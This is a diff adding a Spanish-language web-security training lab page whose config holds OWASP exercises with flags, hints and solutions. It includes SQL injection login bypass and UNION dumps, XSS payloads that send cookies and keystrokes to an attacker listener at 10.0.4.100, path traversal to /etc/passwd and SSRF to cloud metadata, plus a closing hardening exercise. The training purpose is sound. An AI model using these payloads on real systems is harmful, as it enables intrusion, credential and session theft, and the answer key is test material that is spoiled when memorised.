@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>💉 Explotación Web — OWASP Top 10 — CyberDefense Labs</title>
+    <link rel="stylesheet" href="../../assets/css/lab-runner.css">
+</head>
+<body>
+    <div class="lab-page" id="lab-page"></div>
+
+    <script src="../../docs/assets/js/gamification.js"></script>
+    <script src="../../assets/js/lab-runner.js"></script>
+
+    <script>
+    const LAB_CONFIG = {
+        id: 'webapp-01',
+        name: 'Explotación Web — OWASP Top 10',
+        subtitle: 'SQLi, XSS, IDOR y SSRF en una aplicación vulnerable real',
+        icon: '💉',
+        difficulty: 'intermedio',
+        totalXP: 400,
+        time: '90 min',
+        exercises: [
+            {
+                title: 'Reconocimiento de la Aplicación',
+                xp: 30,
+                objective: 'Mapea la superficie de ataque: tecnologías, directorios y archivos sensibles.',
+                steps: [
+                    'Inspecciona headers: <code>curl -I http://10.0.4.10/</code>',
+                    'Enumera directorios: <code>ffuf -u http://10.0.4.10/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200</code>',
+                    'Busca archivos sensibles: <code>.env, .git/config, config.php</code>',
+                    'Identifica tecnologías: PHP, Node.js, MySQL'
+                ],
+                code: `<span class="command">curl -I http://10.0.4.10/</span>\n<span class="output">Server: Apache/2.4.52 (Ubuntu)</span>\n<span class="output">X-Powered-By: PHP/8.1.2</span>\n\n<span class="command">ffuf -u http://10.0.4.10/FUZZ -w common.txt -mc 200</span>\n<span class="output">/admin/        [Status: 302]</span>\n<span class="output">/login.php     [Status: 200]</span>\n<span class="output">/search.php    [Status: 200]</span>\n<span class="output">/upload.php    [Status: 200]</span>\n<span class="output">/.env          [Status: 200]</span>`,
+                codeLang: 'bash',
+                flag: 'FLAG{recon_app_surface_mapped}',
+                hint: 'Apache + PHP 8.1. El .env expone credenciales de MySQL.',
+                solution: 'Apache 2.4.52, PHP 8.1.2, MySQL. Directorios: /admin, /login, /search, /upload. .env expone DB creds.'
+            },
+            {
+                title: 'SQL Injection — Autenticación',
+                xp: 50,
+                objective: 'Bypass de login usando SQL Injection y extrae credenciales.',
+                steps: [
+                    'Intenta login: <code>admin\'-- / cualquier_pass</code>',
+                    'Prueba <code>\' OR \'1\'=\'1</code> en usuario y contraseña',
+                    'Extrae datos: <code>\' UNION SELECT username,password FROM users--</code>',
+                    'Usa sqlmap para automatizar'
+                ],
+                code: `<span class="comment"># Bypass de login</span>\n<span class="flag">user: admin'--</span>\npass: anything\n\n<span class="comment"># UNION injection</span>\n<span class="flag">' UNION SELECT null,null--</span>  (2 columnas)\n<span class="flag">' UNION SELECT username,password FROM users--</span>\n\n<span class="output">admin:5f4dcc3b5aa765d61d8327deb882cf99</span>\n<span class="output">editor:a]8f0623d408c3e788eff897f82e68c4b</span>\n\n<span class="comment"># sqlmap</span>\n<span class="command">sqlmap -u "http://10.0.4.10/login.php" --data="user=admin&pass=test" --dbs --batch</span>`,
+                codeLang: 'bash',
+                flag: 'FLAG{sqli_auth_bypass_admin}',
+                hint: 'admin\'-- comenta el resto de la query SQL. UNION necesita 2 columnas.',
+                solution: "admin'-- bypassa el login. ' UNION SELECT username,password FROM users-- extrae: admin (password), editor (editor123)."
+            },
+            {
+                title: 'SQL Injection — Búsqueda',
+                xp: 50,
+                objective: 'Explota SQLi en el campo de búsqueda para extraer la base de datos completa.',
+                steps: [
+                    'Determina columnas: <code>\' ORDER BY 1-- \', <code>\' ORDER BY 2-- \', <code>\' ORDER BY 3--</code>',
+                    'UNION: <code>\' UNION SELECT null,null--</code>',
+                    'Extrae tablas: <code>\' UNION SELECT table_name,null FROM information_schema.tables--</code>',
+                    'Dump completo con sqlmap'
+                ],
+                code: `<span class="comment"># Determinar columnas</span>\n' ORDER BY 1--  <span class="output">✓ OK</span>\n' ORDER BY 2--  <span class="output">✓ OK</span>\n' ORDER BY 3--  <span class="flag">✗ ERROR → 2 columnas</span>\n\n<span class="comment"># UNION injection</span>\n<span class="flag">' UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_name='users'--</span>\n\n<span class="output">users → id, username, password, email</span>\n<span class="output">logs → id, user_id, action, timestamp</span>\n<span class="output">settings → id, key, value</span>`,
+                codeLang: 'bash',
+                flag: 'FLAG{sqli_search_db_extracted}',
+                hint: 'ORDER BY 3 falla = 2 columnas. information_schema es el catálogo de MySQL.',
+                solution: '2 columnas. information_schema revela: users (id,username,password,email), logs, settings.'
+            },
+            {
+                title: 'XSS — Reflejado',
+                xp: 50,
+                objective: 'Ejecuta JavaScript en el navegador de la víctima a través de la búsqueda.',
+                steps: [
+                    'Prueba básico: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>',
+                    'Si hay filtro: <code>&lt;img src=x onerror=alert(1)&gt;</code>',
+                    'Bypass: <code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code>',
+                    'Roba cookie: <code>&lt;script&gt;new Image().src="http://10.0.4.100:8080/steal?c="+document.cookie&lt;/script&gt;</code>'
+                ],
+                code: `<span class="comment"># XSS Reflejado — búsqueda</span>\n<span class="flag">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span>\n\n<span class="comment"># Si hay filtro de script</span>\n<span class="flag">&lt;img src=x onerror="alert(1)"&gt;</span>\n\n<span class="comment"># Robo de cookie</span>\n<span class="flag">&lt;script&gt;new Image().src="http://10.0.4.100:8080/steal?c="+document.cookie&lt;/script&gt;</span>\n\n<span class="command"># Listener</span>\nnc -lvnp 8080`,
+                codeLang: 'html',
+                flag: 'FLAG{xss_reflected_cookie_theft}',
+                hint: 'El parámetro q de search.php refleja sin sanitizar.',
+                solution: 'search.php?q=<script>... refleja directo. El onerror bypassa algunos filtros. Cookie se envía al attacker.'
+            },
+            {
+                title: 'XSS — Almacenado',
+                xp: 50,
+                objective: 'Inyecta XSS persistente que se ejecuta para cada visitante del foro.',
+                steps: [
+                    'Navega al guestbook/comentarios',
+                    'Inserta payload en el campo de nombre o mensaje',
+                    'Verifica que persiste tras recargar',
+                    'Prueba payload avanzado con robo de credenciales'
+                ],
+                code: `<span class="comment"># Stored XSS en guestbook</span>\n<span class="flag">&lt;script&gt;document.location='http://10.0.4.100:8080/steal?c='+document.cookie&lt;/script&gt;</span>\n\n<span class="comment"># Más stealthy — iframe oculto</span>\n<span class="flag">&lt;iframe style="display:none" src="http://10.0.4.100:8080/k?k="&gt;&lt;/iframe&gt;</span>\n\n<span class="comment"># Keylogger</span>\n<span class="flag">&lt;script&gt;document.onkeypress=function(e){fetch("http://10.0.4.100:8080/k?k="+e.key)}&lt;/script&gt;</span>`,
+                codeLang: 'html',
+                flag: 'FLAG{xss_stored_persistent_payload}',
+                hint: 'El XSS almacenado persiste en la base de datos y se ejecuta para TODOS los visitantes.',
+                solution: 'El payload se almacena en la BD y se muestra a cada usuario que visita el guestbook.'
+            },
+            {
+                title: 'IDOR — Insecure Direct Object Reference',
+                xp: 50,
+                objective: 'Accede a perfiles y documentos de otros usuarios cambiando IDs.',
+                steps: [
+                    'Consulta tu perfil: <code>/api/users/1</code>',
+                    'Cambia el ID: <code>/api/users/2, /api/users/3</code>',
+                    'Prueba en documentos: <code>/download.php?file=invoice_002.pdf</code>',
+                    'Enumera todos los IDs posibles'
+                ],
+                code: `<span class="comment"># IDOR en API</span>\ncurl http://10.0.4.20/api/users/<span class="flag">1</span>  <span class="output">→ tu perfil</span>\ncurl http://10.0.4.20/api/users/<span class="flag">2</span>  <span class="output">→ admin: admin@corp.net</span>\ncurl http://10.0.4.20/api/users/<span class="flag">3</span>  <span class="output">→ user: user@corp.net</span>\n\n<span class="comment"># IDOR en archivos</span>\ncurl http://10.0.4.10/download.php?file=<span class="flag">invoice_001.pdf</span>\ncurl http://10.0.4.10/download.php?file=<span class="flag">invoice_002.pdf</span>\n<span class="flag">curl http://10.0.4.10/download.php?file=../../etc/passwd</span>  <span class="output">→ Path Traversal!</span>`,
+                codeLang: 'bash',
+                flag: 'FLAG{idor_user_data_accessed}',
+                hint: 'No hay verificación de ownership — cualquier ID devuelve datos.',
+                solution: 'API /users/{id} no valida permisos. /download.php acepta path traversal a ../../etc/passwd.'
+            },
+            {
+                title: 'SSRF — Server-Side Request Forgery',
+                xp: 50,
+                objective: 'Usa SSRF para escanear puertos internos y acceder a servicios no expuestos.',
+                steps: [
+                    'Accede a metadata: <code>/fetch.php?url=http://169.254.169.254/latest/meta-data/</code>',
+                    'Port scan interno: <code>/fetch.php?url=http://127.0.0.1:22</code>',
+                    'Accede a MySQL: <code>/fetch.php?url=http://127.0.0.1:3306</code>',
+                    'Explora la red interna'
+                ],
+                code: `<span class="comment"># SSRF — services internos</span>\ncurl "http://10.0.4.10/fetch.php?url=<span class="flag">http://127.0.0.1:22</span>"\n<span class="output">SSH-2.0-OpenSSH_8.4p1</span>\n\ncurl "http://10.0.4.10/fetch.php?url=<span class="flag">http://127.0.0.1:3306</span>"\n<span class="output">5.7.36mysql_native_password</span>\n\n<span class="comment"># Port scan</span>\nfor port in 22 80 443 3306 8080; do\n    curl -s "http://10.0.4.10/fetch.php?url=http://127.0.0.1:$port"\ndone\n\n<span class="output">22: abierto, 3306: abierto, 8080: cerrado</span>`,
+                codeLang: 'bash',
+                flag: 'FLAG{ssrf_internal_port_scan}',
+                hint: 'fetch.php hace requests desde el servidor. Puedes acceder a 127.0.0.1 y servicios internos.',
+                solution: 'fetch.php expone SSRF completo. 127.0.0.1:22 (SSH), :3306 (MySQL). Se puede escanear toda la red interna.'
+            },
+            {
+                title: 'Hardening y Defensa',
+                xp: 70,
+                objective: 'Aplica headers de seguridad y mitiga las vulnerabilidades encontradas.',
+                steps: [
+                    'Verifica headers: <code>curl -I http://10.0.4.10/</code>',
+                    'Agrega X-Frame-Options, CSP, X-Content-Type-Options',
+                    'Implementa WAF rules para SQLi y XSS',
+                    'Documenta cada mitigación'
+                ],
+                code: `<span class="comment"># Headers de seguridad faltantes</span>\nX-Frame-Options: SAMEORIGIN\nX-Content-Type-Options: nosniff\nX-XSS-Protection: 1; mode=block\nContent-Security-Policy: default-src 'self'\nStrict-Transport-Security: max-age=31536000\n\n<span class="comment"># .htaccess</span>\n<span class="flag">Header always set X-Frame-Options "SAMEORIGIN"</span>\n<span class="flag">Header always set X-Content-Type-Options "nosniff"</span>\n<span class="flag">Header always set Content-Security-Policy "default-src 'self'"</span>\n\n<span class="comment"># SQLi: usar prepared statements</span>\n<span class="flag">$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");</span>\n$stmt->execute([$_GET['id']]);`,
+                codeLang: 'apache',
+                flag: 'FLAG{hardening_headers_applied}',
+                hint: 'Los 5 headers clave: X-Frame-Options, CSP, X-Content-Type-Options, X-XSS-Protection, HSTS.',
+                solution: 'Apache .htaccess agrega los 5 headers. Prepared statements eliminan SQLi. Input validation mitiga XSS.'
+            }
+        ]
+    };
+
+    document.addEventListener('DOMContentLoaded', () => {
+        CDPN_LabRunner.init(LAB_CONFIG);
+    });
+    </script>
+</body>
+</html>
